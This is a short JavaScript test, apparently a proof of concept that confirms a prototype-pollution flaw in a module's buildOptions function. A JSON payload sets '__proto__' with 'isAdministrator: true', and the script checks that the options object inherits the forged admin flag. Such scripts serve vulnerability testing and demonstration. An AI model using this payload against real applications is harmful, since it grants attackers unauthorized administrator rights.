import { buildOptions } from "./src/storage.js";

const patch = JSON.parse('{"__proto__":{"isAdministrator":true}}');
const options = buildOptions(patch);
if (Object.getPrototypeOf(options).isAdministrator !== true) {
  throw new Error("Object.assign did not replace the target prototype");
}
if (options.isAdministrator !== true) {
  throw new Error("authorization lookup did not inherit attacker state");
}
if ({}.isAdministrator !== undefined) {
  throw new Error(
    "shallow Object.assign unexpectedly modified Object.prototype",
  );
}
console.log("vulnerable Object.assign replaced the options prototype");
